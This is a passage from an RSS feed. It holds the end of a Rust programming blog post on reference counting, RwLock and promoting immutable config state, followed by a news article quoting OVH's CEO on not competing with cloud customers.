&lt;span class=&quot;w&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;inner&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;read&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;unwrap&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;debug_mode&lt;/span&gt;
&lt;span class=&quot;w&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;w&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;pub&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;fn&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;set_debug_mode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;bool&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
&lt;span class=&quot;w&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;inner&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;write&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;unwrap&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;debug_mode&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;w&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;thread_local&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
&lt;span class=&quot;w&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;static&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;CURRENT_CONFIG&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Arc&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Config&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Config&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;new&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;fn&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
&lt;span class=&quot;w&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;let&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;config&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Config&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;current&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
&lt;span class=&quot;w&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;config&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;set_debug_mode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;w&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;config&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;debug_mode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
&lt;span class=&quot;w&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;// do something&lt;/span&gt;
&lt;span class=&quot;w&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;If you do not need this type to work with threads you can also replace &lt;cite&gt;Arc&lt;/cite&gt; with &lt;cite&gt;Rc&lt;/cite&gt; and &lt;cite&gt;RwLock&lt;/cite&gt; with &lt;cite&gt;RefCell&lt;/cite&gt;.&lt;/p&gt;
&lt;p&gt;&lt;em&gt;To recap: when you need to borrow data that outlives the lifetime of something you need refcounting. Don't be afraid of using `Arc` but be aware that this locks you to immutable data. Combine with interior mutability (like `RwLock`) to make the object mutable.&lt;/em&gt;&lt;/p&gt;
&lt;/div&gt;
&lt;div class=&quot;section&quot; id=&quot;kill-all-setters&quot; readability=&quot;35.5&quot;&gt;
&lt;h2&gt;Kill all Setters&lt;/h2&gt;
&lt;p&gt;But the above pattern of effectively having &lt;cite&gt;Arc&amp;lt;RwLock&amp;lt;Config&amp;gt;&amp;gt;&lt;/cite&gt; can be a bit problematic and swapping it for &lt;cite&gt;RwLock&amp;lt;Arc&amp;lt;Config&amp;gt;&amp;gt;&lt;/cite&gt; can be significantly better.&lt;/p&gt;
&lt;p&gt;Rust done well is a liberating experience because if programmed well it's shockingly easy to parallelize your code after the fact. Rust encourages immutable data and that makes everything so much easier. However in the previous example we just introduced interior mutability. Imagine we have multiple threads running, all referencing the same config but one flips a flag. What happens to concurrently running code that now is not expecting the flag to randomly flip? Because of that interior mutability should be used carefully. Ideally an object once created does not change its state in such a way. In general I think such a type of setter should be an anti pattern.&lt;/p&gt;
&lt;p&gt;So instead of doing this what about we take a step back to where we were earlier where configs were not mutable? What if we never mutate the config after we created it but we add an API to promote another config to current. This means anyone who is currently holding on to a config can safely know that the values won't change.&lt;/p&gt;
&lt;div class=&quot;highlight&quot; readability=&quot;12&quot;&gt;
&lt;pre&gt;
&lt;span class=&quot;kn&quot;&gt;use&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;std&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sync&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Arc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;RwLock&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;

&lt;span class=&quot;cp&quot;&gt;#[derive(Default)]&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Config&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
&lt;span class=&quot;w&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;pub&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;debug_mode&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;bool&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;impl&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Config&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
&lt;span class=&quot;w&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;pub&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;fn&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;current&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Arc&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Config&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
&lt;span class=&quot;w&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;CURRENT_CONFIG&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;with&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;read&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;unwrap&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;clone&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;())&lt;/span&gt;
&lt;span class=&quot;w&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;w&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;pub&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;fn&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;make_current&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
&lt;span class=&quot;w&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;CURRENT_CONFIG&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;with&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;write&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;unwrap&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Arc&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;new&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
&lt;span class=&quot;w&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;thread_local&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
&lt;span class=&quot;w&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;static&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;CURRENT_CONFIG&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;RwLock&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Arc&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Config&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;RwLock&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;new&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;Default&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;default&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;());&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;fn&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
&lt;span class=&quot;w&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Config&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;debug_mode&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;make_current&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
&lt;span class=&quot;w&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Config&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;current&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;debug_mode&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
&lt;span class=&quot;w&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;// do something&lt;/span&gt;
&lt;span class=&quot;w&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Now configs are still initialized automatically by default but a new config can be set by constructing a &lt;cite&gt;Config&lt;/cite&gt; object and calling &lt;cite&gt;make_current&lt;/cite&gt;. That will move the config into an &lt;cite&gt;Arc&lt;/cite&gt; and then bind it to the current thread. Callers to &lt;cite&gt;current()&lt;/cite&gt; will get that &lt;cite&gt;Arc&lt;/cite&gt; back and can then again do whatever they want.&lt;/p&gt;
&lt;p&gt;Likewise you can again switch &lt;cite&gt;Arc&lt;/cite&gt; for &lt;cite&gt;Rc&lt;/cite&gt; and &lt;cite&gt;RwLock&lt;/cite&gt; for &lt;cite&gt;RefCell&lt;/cite&gt; if you do not need this to work with threads. If you are just working with thread locals you can also combine &lt;cite&gt;RefCell&lt;/cite&gt; with &lt;cite&gt;Arc&lt;/cite&gt;.&lt;/p&gt;
&lt;p&gt;&lt;em&gt;To recap: instead of using interior mutability where an object changes its internal state, consider using a pattern where you promote new state to be current and current consumers of the old state will continue to hold on to it by putting an `Arc` into an `RwLock`.&lt;/em&gt;&lt;/p&gt;
&lt;/div&gt;
&lt;div class=&quot;section&quot; id=&quot;in-conclusion&quot; readability=&quot;9&quot;&gt;
&lt;h2&gt;In Conclusion&lt;/h2&gt;
&lt;p&gt;Honestly I wish I would have learned the above three things earlier than I did. Mostly because even if you know the patterns you might not necessarily know when to use them. So I guess the following mantra is now what I want to print out and hang somewhere:&lt;/p&gt;
&lt;ul class=&quot;simple&quot;&gt;&lt;li&gt;Handles, not self referential pointers&lt;/li&gt;
&lt;li&gt;Reference count your way out of lifetime / borrow checker hell&lt;/li&gt;
&lt;li&gt;Consider promoting new state instead of interior mutability&lt;/li&gt;
&lt;/ul&gt;&lt;/div&gt;
&lt;p class=&quot;tags&quot;&gt;This entry was tagged &lt;a href=&quot;http://lucumr.pocoo.org/tags/rust/&quot;&gt;rust&lt;/a&gt; &lt;/p&gt;
</description>
<pubDate>Sat, 31 Mar 2018 16:00:58 +0000</pubDate>
<dc:creator>stablemap</dc:creator>
<dc:format>text/html</dc:format>
<dc:identifier>http://lucumr.pocoo.org/2018/3/31/you-cant-rust-that/</dc:identifier>
</item>
<item>
<title>OVH CEO: Unlike Amazon, Google, “we will never be in competition with you”</title>
<link>http://www.datacenterdynamics.com/content-tracks/colo-cloud/ovh-ceo-unlike-amazon-google-we-will-never-be-in-competition-with-you/99939.fullarticle</link>
<guid isPermaLink="true" >http://www.datacenterdynamics.com/content-tracks/colo-cloud/ovh-ceo-unlike-amazon-google-we-will-never-be-in-competition-with-you/99939.fullarticle</guid>
<description>&lt;p&gt;The CEO of French hosting and cloud computing company OVH has promised his company will stick to the cloud, and not compete with its own customers.&lt;/p&gt;
&lt;p&gt;In a dig at hyperscalers like Amazon, Alibaba and Google, whose businesses are myriad, Octave Klaba highlighted the fact that turning to those companies can mean subsidizing entities that aim to take your business.&lt;/p&gt;
&lt;h2 id=&quot;Im_not_going_to_do_anything_you_can_do_Better&quot;&gt;I’m not going to do anything you can do. Better?&lt;/h2&gt;
&lt;div class=&quot;inline_image inline_image_right image_size_med fullsize&quot; data-attachment=&quot;24193&quot; data-sequence=&quot;1&quot;&gt;&lt;button class=&quot;show-fullscreen&quot; data-url=&quot;/Attachments.aspx?attype=I&amp;amp;atcode=24193&amp;amp;storycode=99939&quot;&gt;Show Fullscreen&lt;/button&gt;
&lt;p class=&quot;picture&quot;&gt;&lt;img alt=&quot;OVH, Beauharnois, Quebec&quot; src=&quot;http://www.datacenterdynamics.com/pictures/280xany/1/9/3/24193_OVH-Beauharnois-Quebec.jpg&quot; class=&quot;responsiveImage&quot; data-size-1=&quot;280xany&quot;/&gt;&lt;/p&gt;
&lt;p class=&quot;inline_title&quot;&gt;OVH, Beauharnois, Quebec&lt;/p&gt;
&lt;p class=&quot;inline_source&quot;&gt;&lt;cite&gt;Source: OVH&lt;/cite&gt;&lt;/p&gt;
&lt;/div&gt;
&lt;p&gt;“You might have a very good business, but if you choose a cloud provider that says ’okay it’s a good business you are doing and I can do this same business on my own,’ maybe it’s not the best choice for you,” Klaba said in a keynote at Data Centre World in London.&lt;/p&gt;
&lt;p&gt;“If your cloud provider can be, in the future, your competitor, what are the choices you have to make today? OVH’s business is cloud. We will never do anything else except cloud, and we will never be in competition with you, with the business that you are doing.&lt;/p&gt;
&lt;p&gt;“That’s not always the case with [service] providers in the world, and you see every day, every month, the new announcement of the cloud providers, the big giants of the Internet, that they are just going and going after your business.”&lt;/p&gt;
&lt;p&gt;Concerns about funding a competitor are thought to be the reason for US retailer Target recently &lt;a href=&quot;http://www.datacenterdynamics.com/content-tracks/colo-cloud/report-target-to-leave-aws-after-amazon-buys-whole-foods/98881.fullarticle&quot;&gt;shifting away from Amazon Web Services&lt;/a&gt;, after Amazon acquired grocery chain Whole Foods, and why Walmart made considerable efforts to diversify its cloud portfolio.&lt;/p&gt;
&lt;p&gt;Klaba also noted that “OVH is the only European company that provides cloud services on the global scale,” adding, “we just invested $1.5bn in infrastructure - 300,000 servers deployed, 27 data centers across 12 locations on three continents, 13Tbps of network capacity, 32 PoPs.&lt;/p&gt;
&lt;p&gt;“It’s a lot of responsibility in the choice of the cloud provider, we believe we can be an alternative cloud on the market,” he said.&lt;/p&gt;
</description>
<pubDate>Sat, 31 Mar 2018 15:09:16 +0000</pubDate>
<dc:creator>krn</dc:creator>
<og:title>OVH CEO: Unlike Amazon, Google, &quot;we will never be in competition with you&quot;</og:title>
<og:type>Article</og:type>
<og:url>http://www.datacenterdynamics.com/content-tracks/colo-cloud/ovh-ceo-unlike-amazon-google-we-will-never-be-in-competition-with-you/99939.fullarticle</og:url>
<og:description>European data center company is not planning to diversify into online shopping</og:description>
<og:image>http://www.datacenterdynamics.com/pictures/2000x2000fit/1/9/3/24193_OVH-Beauharnois-Quebec.jpg</og:image>
<dc:language>en</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.datacenterdynamics.com/content-tracks/colo-cloud/ovh-ceo-unlike-amazon-google-we-will-never-be-in-competition-with-you/99939.fullarticle</dc:identifier>
</item>
</channel>
</rss>